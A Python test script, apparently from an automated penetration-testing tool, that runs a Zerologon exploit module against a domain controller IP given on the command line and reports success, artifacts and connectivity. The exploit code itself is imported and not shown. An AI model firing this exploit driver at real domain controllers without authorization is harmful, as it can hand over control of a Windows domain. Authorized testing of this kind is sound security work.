#!/usr/bin/env python3
"""
Zerologon Exploit Test Script
Quick test of the Zerologon implementation
"""

import sys
from pathlib import Path

# Add backend to path
sys.path.insert(0, str(Path(__file__).parent))

from backend.exploiter.zerologon_executor import ZerologonExecutor
import json

def test_zerologon(target_ip: str, dc_name: str = "DC01"):
    """
    Test Zerologon exploit against a target
    
    Args:
        target_ip: Target IP address
        dc_name: Domain Controller name (NetBIOS name, not FQDN)
    """
    print("="*70)
    print("Zerologon Exploit Test")
    print("="*70)
    print(f"\nTarget: {target_ip}")
    print(f"DC Name: {dc_name}")
    print("\n" + "="*70)
    print()
    
    # Initialize executor
    executor = ZerologonExecutor()
    
    # Execute exploit
    print("[*] Starting exploit execution...\n")
    result = executor.execute_zerologon(target_ip, dc_name)
    
    # Display results
    print("\n" + "="*70)
    print("RESULTS")
    print("="*70)
    print(f"\nStatus: {'✓ SUCCESS' if result['success'] else '✗ FAILED'}")
    print(f"Execution Time: {result['execution_time']:.2f} seconds")
    print(f"Return Code: {result.get('return_code', 'N/A')}")
    print(f"\nVulnerability Confirmed: {result['vulnerability_confirmed']}")
    print(f"Exploit Successful: {result['exploit_successful']}")
    
    if result['attempts_made']:
        print(f"Attempts Made: {result['attempts_made']}")
    
    print("\nArtifacts:")
    for artifact in result['artifacts']:
        print(f"  {artifact}")
    
    # Show connectivity check
    if result['connectivity_check']:
        conn = result['connectivity_check']
        print(f"\nConnectivity Check:")
        print(f"  Reachable: {conn['reachable']}")
        print(f"  SMB Open: {conn['smb_open']}")
        if conn['errors']:
            print(f"  Errors: {', '.join(conn['errors'])}")
    
    # Show failure analysis if available
    if result.get('failure_analysis'):
        analysis = result['failure_analysis']
        print(f"\nFailure Analysis:")
        print(f"  Confidence: {analysis['confidence_score']*100:.0f}%")
        print(f"  Categories: {len(analysis['failure_categories'])}")
        print(f"  Recommendations: {len(analysis['recommendations'])}")
        print(f"  Alternatives: {len(analysis['alternative_approaches'])}")
    
    # Save results
    output_file = f"test_zerologon_{target_ip.replace('.', '_')}.json"
    with open(output_file, 'w') as f:
        json.dump(result, f, indent=2, default=str)
    
    print(f"\nResults saved to: {output_file}")
    print("\n" + "="*70)
    
    return result

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python test_zerologon.py <TARGET_IP> [DC_NAME]")
        print("\nExample: python test_zerologon.py 192.168.253.30 DC2019")
        print("\nNote: DC_NAME should be the NetBIOS name, not FQDN")
        print("      (e.g., 'DC01' not 'dc01.domain.com')")
        sys.exit(1)
    
    target = sys.argv[1]
    dc_name = sys.argv[2] if len(sys.argv) > 2 else "DC01"
    
    try:
        result = test_zerologon(target, dc_name)
        sys.exit(0 if result['success'] else 1)
    except KeyboardInterrupt:
        print("\n\n[!] Test interrupted by user")
        sys.exit(2)
    except Exception as e:
        print(f"\n\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(2)
